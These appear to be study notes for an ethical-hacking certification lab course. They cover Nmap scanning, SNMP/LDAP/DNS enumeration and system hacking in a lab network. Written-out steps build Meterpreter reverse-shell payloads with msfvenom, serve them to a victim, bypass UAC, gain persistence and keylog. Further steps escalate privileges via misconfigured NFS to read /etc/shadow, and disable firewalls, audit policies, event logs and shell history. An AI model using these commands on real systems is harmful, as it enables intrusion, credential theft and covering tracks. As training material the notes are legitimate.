# Module 3: Scanning Networks

## Lab 1: Perform Host Discovery using Nmap

### Task 1: Perform Host Discovery using Nmap

+ Open the `terminal`
+ `sudo su`
+ type **`nmap command`**
  
  + ARP ping scan

        nmap -sn -PR [Target IP Address]

  + UDP ping scan
  
        nmap -sn -PU [Target IP Address]

  + ICMP ECHO ping scan
  
        nmap -sn -PE [Target IP Address]

  + ICMP ECHO ping sweep
  
        nmap -sn -PE [Target Range of IP Addresses]

  + ICMP timestamp ping scan
  
        nmap -sn -PP [Target IP Address]

  + ICMP Address Mask Ping Scan

        nmap -sn -PM [target IP address]
    
  + TCP SYN Ping Scan

        nmap -sn -PS [target IP address]

  + TCP ACK Ping Scan
  
        nmap -sn -PA [target IP address]

  + IP Protocol Ping Scan

        nmap -sn -PO [target IP address]

---

## Lab 2: Perform Port and Service Discovery

### Task 4: Explore Various Network Scanning Techniques using Nmap

+ open `nmap` / `zenmap`
+ type **`nmap command`**
  
  + TCP connect/full open scan

         nmap -sT -v [Target IP Address]

  + stealth scan/TCP half-open scan
  
        nmap -sS -v [Target IP Address]

  + Xmas scan
  
        nmap -sX -v [Target IP Address]

    + open/filtered -> firewall configured on target machine
  
  + TCP Maimon scan
  
        nmap -sM -v [Target IP Address]

    + open/filtered -> firewall configured on target machine

  + Null Scan
  
        nmap -sN -T4 -A -v [Target IP Address]

  + IDLE/IPID Header Scan (spoofed source address to a computer to discover what services are available)

         nmap -sI -v [target IP address]

  + SCTP INIT Scan (An INIT chunk is sent to the target host)
  
        nmap -sY -v [target IP address]

    + INIT+ACK chunk response implies that the port is open, and an ABORT Chunk response means that the port is closed

  + SCTP COOKIE ECHO Scan (COOKIE ECHO chunk is sent to the target host)
  
        nmap -sZ -v [target IP address]

    + no response implies that the port is open and ABORT Chunk response means that the port is closed
  
  + detects service versions
  
        nmap -sV [Target IP Address]

    + open/filtered -> firewall configured on target machine

  + Aggressive scan on a target subnet
  
        nmap -A [Target Subnet]

---

## Lab 3: Perform OS Discovery

### Task 1: Identify the Target System’s OS with Time-to-Live (TTL) and TCP Window Sizes using Wireshark

+ Open Wireshark and capture ETHERNET adapter
+ ping [Target IP Address]
+ Observe ICMP Packet
  + Internet Protocol Version 4 > Time to Live


|Operating System|TTL|TCP Window Size|
|---|---|---|
|Linux OS|64|5840|
|FreeBSD OS|64|65525|
|Windows OS|128|65535MB - 1GB|
|OpenBSD OS|255|16384|
|Cisco Routers OS|255|4128|
|Solaris OS|255|8760|
|AIX OS|255|16384|


### Task 2: Perform OS Discovery using Nmap Script Engine (NSE)

+ Open Terminal
+ `sudo su`
+ type **`nmap command`**
  
  + Perform Aggresive Scan

         nmap -A [Target IP Address]

  + Perform OS Discovery
  
        nmap -O [Target IP Address]

  + Determine OS, computer name, domain, workgroup, and current time over the SMB protocol (ports 445 or 139)
  
        nmap --script smb-os-discovery.nse [Target IP Address]

    + Possible Target Machine: Windows Server 2022 [10.10.1.22]
  
---

## Lab 5: Perform Network Scanning using Various Scanning Tools

### Task 1: Scan a Target Network using Metasploit

+ sudo su
+ cd
+ service postgresql start
+ msfconsole
+ db_status
  + If database not connected
    + exit
    + msfdb init
    + service postgresql restart
    + msfconsole
    + db_status
+ nmap -Pn -sS -A -oX Test 10.10.1.0/24
  + scanning the whole subnet 10.10.1.0/24 for active hosts
+ db_import Test
+ hosts
  + view the list of active hosts along with their MAC addresses, OS names, etc
+ services
  + receive a list of the services running on the active hosts
+ search portscan
+ use auxiliary/scanner/portscan/syn
+ Perform an SYN scan against the target IP address range (10.10.1.5-23) to look for open port 80 through the eth0 interface
  + set INTERFACE [Interface Port found from ifconfig]
  + set PORTS 80
  + set RHOSTS 10.10.1.5-23
  + set THREADS 50
+ run
+ use auxiliary/scanner/portscan/tcp
+ set RHOSTS [Target IP Address]
+ run
+ back
+ use auxiliary/scanner/smb/smb_version
+ set RHOSTS 10.10.1.5-23
+ set THREADS 11
+ run

---

# Module 4: Enumeration

## Lab 1: Perform NetBIOS Enumeration

### Task 3: Perform NetBIOS Enumeration using an NSE Script

+ Open Terminal
+ sudo su
+ nmap -sV -v --script nbstat.nse [Target IP Address]
  + --script nbstat.nse performs the NetBIOS enumeration
+ nmap -sU -p 137 --script nbstat.nse [Target IP Address]

## Lab 2:  Perform SNMP Enumeration

### Task 3: Perform SNMP Enumeration using SnmpWalk

+ Open Terminal
+ sudo su
+ snmpwalk -v1 -c public [target IP]
  + –v: specifies the SNMP version number (1 or 2c or 3) 
  + –c: sets a community string.
+ snmpwalk -v2c -c public [Target IP Address]

## Lab 3: Perform LDAP Enumeration

### Task 2: Perform LDAP Enumeration using Python and Nmap

#### LDAP Enumeration with Nmap

+ Open Terminal
+ sudo su
+ nmap -sU -p 389 [Target IP address]
+ nmap -p 389 --script ldap-brute --script-args ldap.base='"cn=users,dc=CEH,dc=com"' [Target IP Address]
  + -p: specifies the port to be scanned
  + ldap-brute: to perform brute-force LDAP authentication
  + ldap.base: if set, the script will use it as a base for the password guessing attempts

#### LDAP Enumeration with Python

+ Open Terminal
+ sudo su
+ python3
+ nano ldapbruteforce.py
+ Type the following into ldapbruteforce.py

```py
import ldap3
server=ldap3.Server('[Target IP Address]', get_info=ldap3.ALL,port=389)
connection=ldap3.Connection(server)
print(connection.bind())
print(server.info)
print(connection.search(search_base='DC=CEH,DC=com', search_filter='(&(objectclass=*))', search_scope='SUBTREE', attributes='*'))
print(connection.entries)
print(connection.search(search_base='DC=CEH,DC=com', search_filter='(&(objectclass=person))', search_scope='SUBTREE', attributes='userpassword'))
print(connection.entries)
```

## Lab 5: Perform DNS Enumeration

### Task 3: Perform DNS Enumeration using Nmap

+ Open Terminal
+ sudo su
+ nmap --script=broadcast-dns-service-discovery [Target Domain]
+ nmap -T4 -p 53 --script dns-brute [Target Domain]
+ nmap --script dns-srv-enum --script-args "dns-srv-enum.domain='[Target Domain]'”
  + [Target Domain] -> certifiedhacker.com

---

# Module 5: Vulnerability Analysis

## Lab 1: Perform Vulnerability Research with Vulnerability Scoring Systems and Databases

### Task 2: Perform Vulnerability Research in Common Vulnerabilities and Exposures (CVE)

+ Search CVE List
  + service-related vulnerability
  + vulnerability name
  + CVE-ID

--- 

# Module 06: System Hacking

## Lab 1: Gain Access to the System

### Task 2: Audit System Passwords using L0phtCrack

+ Login to Windows 11 as Admin
+ open L0phtCrack 7 
+ `Password Auditing Wizard`
+ Target System Type: `Windows`
+ Windows Import: `A remote machine`
+ Windows Import From Remote Machine (SMB) wizard type the following
  + Host: 10.10.1.22 (IP address of the remote machine [Windows Server 2022])
  + Select the `Use Specific User Credentials` radio button. In the Credentials section, type the login credentials of the Windows Server 2022 machine (Username: Administrator; Password: Pa$$w0rd)
  + If the machine is under a domain, enter the domain name in the Domain section. Here, Windows Server 2022 belongs to the CEH.com domain
+ Pick `Thorough Password Audit`
+ Reporting Options wizard
  + Generate Report at End of Auditing
  + CSV
  + Store in Desktop
+ Click `Run this job immediately`

### Task 4: Exploit Client-Side Vulnerabilities and Establish a VNC Session

+ Open Terminal
+ sudo su
+ msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=10.10.1.13 LPORT=444 -o /home/attacker/Desktop/Test.exe
+ mkdir /var/www/html/share
+ chmod -R 755 /var/www/html/share
+ chown -R www-data:www-data /var/www/html/share
+ cp /home/attacker/Desktop/Test.exe /var/www/html/share
+ service apache2 start
+ msfconsole
+ use exploit/multi/handler
+ set payload windows/meterpreter/reverse_tcp
+ set LHOST 10.10.1.13
+ set LPORT 444
+ exploit
+ Open http://10.10.1.13/share on Windows 11 browser
+ Download the Test.exe
+ Execute the Test.exe file
+ Go back to Parrot and observe meterpreter shell
+ sysinfo
+ upload /root/PowerSploit/Privesc/PowerUp.ps1 PowerUp.ps1
+ shell
+ powershell -ExecutionPolicy Bypass -Command ". .\PowerUp.ps1;Invoke-AllChecks"
+ exit
+ run vnc

## Lab 2: Perform Privilege Escalation to Gain Higher Privileges

### Task 2: Hack a Windows Machine using Metasploit and Perform Post-Exploitation using Meterpreter (may extract portion)

+ Create a text file named Secret.txt; write something in this file and save it in the location C:\Users\Admin\Downloads
    
        My credit card account number is 123456789.

+ Open Terminal
+ sudo su
+ cd
+ msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=10.10.1.13 -f exe > /home/attacker/Desktop/Backdoor.exe
+ mkdir /var/www/html/share
+ chmod -R 755 /var/www/html/share
+ chown -R www-data:www-data /var/www/html/share
+ cp /home/attacker/Desktop/Test.exe /var/www/html/share
+ service apache2 start
+ msfconsole
+ use exploit/multi/handler
+ set payload windows/meterpreter/reverse_tcp
+ set LHOST 10.10.1.13
+ show options
+ exploit -j -z
+ Open http://10.10.1.13/share on Windows 11 browser
+ Download the Backdoor.exe
+ Execute the Backdoor.exe file
+ Go back to Parrot and observe meterpreter shell
+ sessions -i 1
+ sysinfo
+ ipconfig
+ getuid
+ pwd
+ ls
+ cat [filename.txt]
+ timestomp Secret.txt -v
  + While performing post-exploitation activities, an attacker tries to access files to read their contents. Upon doing so, the MACE (modified, accessed, created, entry) attributes immediately change, which indicates to the file user or owner that someone has read or modified the information.
+ timestomp Secret.txt -m "MM/DD/YYYY HH:MM:SS"
  + Accessed (-a)
  + Created (-c)
  + Entry Modified (-e)
+ timestomp Secret.txt -v
+ cd C:/
+ pwd
+ search -f [Filename.extension]
  + pagefile.sys
+ keyscan_start
  + Start Key Logging
+ Create a new text file with the following contents in the Windows 11 device
  + My phone number is xxxxxxxx and my email address is xxxxxxxx@gmail.com
+ Go back to Parrot
+ keyscan_dump
  + Stop Key Logging
+ idletime
  + Time which user has been idle on the remote system
+ shell
+ dir /a:h
+ sc queryex type=service state=all 
  + list all available services
+ netsh firewall show state
+ netsh firewall show config
+ wmic /node:"" product get name,version,vendor
  + show details of installed software
+ wmic cpu get
  + show processor information
+ wmic useraccount get name,sid
  + show SID of users
+ wmic os where Primary='TRUE' reboot
  + reboot target system

#### Other Post Exploitation Commands

|Command|Description|
|---|---|
|net start or stop|Starts/stops a network service|
|netsh advfirewall set currentprofile state off|Turn off firewall service for Current profile|
|netsh advfirewall set allprofiles state off|Turn off firewall service for all profiles|

#### Other Post Escalating Privileges Commands

|Command|Description|
|---|---|
|findstr /E ".txt" > txt.txt|Retrieves all the text files (needs privileged access)|
|findstr /E ".log" > log.txt|Retrieves all the log files|
|findstr /E ".doc" > doc.txt|Retrieves all the document files|

### Task 4: Escalate Privileges in Linux Machine by Exploiting Misconfigured NFS 

+ Open Terminal in Ubuntu
+ sudo apt-get update
+ sudo apt install nfs-kernel-server
+ sudo nano /etc/exports
+ /home *(rw,no_root_squash)
+ sudo /etc/init.d/nfs-kernel-server restart
+ Open Terminal in Parrot
+ nmap -sV 10.10.1.9
+ sudo apt-get install nfs-common
+ showmount -e 10.10.1.9
+ mkdir /tmp/nfs
+ sudo mount -t nfs 10.10.1.9:/home /tmp/nfs
+ cd /tmp/nfs
+ sudo cp /bin/bash .
+ sudo chmod +s bash
+ ls -la bash
+ sudo df -h
+ ssh -l ubuntu 10.10.1.9
+ cd /home
+ ls
+ ./bash -p
+ id
  + get id of users
+ whoami
+ cp /bin/nano .
+ chmod 4777 nano
+ ls -la nano
+ cd /home
+ ls
+ ./nano -p /etc/shadow
+ cat /etc/crontab
+ ps -ef
  + View current processes along with the PID
+ find / -name "*.txt" -ls 2> /dev/null
  + view all the .txt files on the system
+ route -n
  + view the host/network names in numeric form
+ find / -perm -4000 -ls 2> /dev/null
  + view the SUID executable binaries

## Lab 3: Maintain Remote Access and Hide Malicious Activities

### Task 3: Hide Files using NTFS Streams

+ Open Command Prompt
+ Type the following commands
  
        notepad [name of file]
        Create the file when prompted
        notepad [name of file]:[stream name]
        type [file to embed] [name of file]:[stream name]

### Task 6: Maintain Persistence by Abusing Boot or Logon Autostart Execution (may extract portion)

+ Open Terminal
+ sudo su
+ cd
+ msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/exploit.exe
+ mkdir /var/www/html/share
+ chmod -R 755 /var/www/html/share
+ chown -R www-data:www-data /var/www/html/share
+ cp /home/attacker/Desktop/exploit.exe /var/www/html/share/
+ service apache2 start
+ msfconsole
+ use exploit/multi/handler
+ set payload windows/meterpreter/reverse_tcp
+ set lhost 10.10.1.13
+ set lport 444
+ run
+ Open http://10.10.1.13/share on Windows 11 browser
+ Download the exploit.exe
+ Execute the exploit.exe file
+ Go back to Parrot and observe meterpreter shell
+ getuid
+ background
+ use exploit/windows/local/bypassuac_fodhelper
+ set session 1
+ show options
+ set LHOST 10.10.1.13
+ set TARGET 0
+ exploit
+ getsystem -t 1
+ getuid
+ cd "C:\\ProgramData\\Start Menu\\Programs\\Startup"
+ pwd
+ In a new terminal execute the following commands
  + msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=8080 -f exe > payload.exe
+ upload /home/attacker/payload.exe
+ Login to the Windows 11 Admin user and restart the machine
+ In a new terminal execute the following commands
  + sudo su
  + msfconsole
  + use exploit/multi/handler
  + set payload windows/meterpreter/reverse_tcp
  + set lhost 10.10.1.13
  + set lport 8080
  + exploit
+ Login to the Windows 11 Admin user and restart the machine
+ Go to the latest terminal and view the meterpreter session that is open
+ getuid

## Lab 4: Clear Logs to Hide the Evidence of Compromise

### Task 1: View, Enable, and Clear Audit Policies using Auditpol

+ Open cmd in Administrator mode on Windows 11
+ auditpol /get /category:*
  + view all the audit policies
+ auditpol /set /category:"system","account logon" /success:enable /failure:enable
  + Enables audit policies
+ auditpol /clear /y
  + Clears all audit policies
+ auditpol /get /category:*

### Task 2: Clear Windows Machine Logs using Various Utilities

+ In the Windows 11 machine, navigate to E:\CEH-Tools\CEHv12 Module 06 System Hacking\Covering Tracks Tools\Clear_Event_Viewer_Logs.bat. Right-click Clear_Event_Viewer_Logs.bat and click Run as administrator
+ Open Command Prompt with Administrator
+ wevtutil el
  + display a list of event logs
+ wevtutil cl [log_name]
  + Clears the log specified
+ cipher /w:[Drive or Folder or File Location]
  + overwrite deleted files in a specific drive, folder, or file

### Task 3: Clear Linux Machine Logs using the BASH Shell

+ Open Terminal
+ export HISTSIZE=0
  + Disable the BASH shell from saving the history
+ history -c
  + Clear stored history
+ history -w
  + Delete the history of the current shell
+ shred ~/.bash_history
  + Shred the history file, making its content unreadable
+ more ~/.bash_history
  + View the shredded history content
+ ctrl+z
+ shred ~/.bash_history && cat /dev/null > .bash_history && history -c && exit
  + Perform all the steps above

---

# Things to note

Module 06 Lab 1: Gain Access to the System
  - Task 7: Perform Buffer Overflow Attack to Gain Access to a Remote System
    - smb://Admin:Pa$$w0rd@10.10.1.11/CEH-Tools

Module 04 Lab 3: Perform LDAP Enumeration
  - Task 3: Perform LDAP Enumeration using ldapsearch
    - ldapsearch -H ldap://10.10.1.22 -x -s base namingcontexts

Module 05 Lab 2: Perform Vulnerability Assessment using Various Vulnerability Assessment Tools
  - Task 4: Perform Web Servers and Applications Vulnerability Scanning using CGI Scanner Nikto
    - nikto -h www.certifiedhacker.com:443
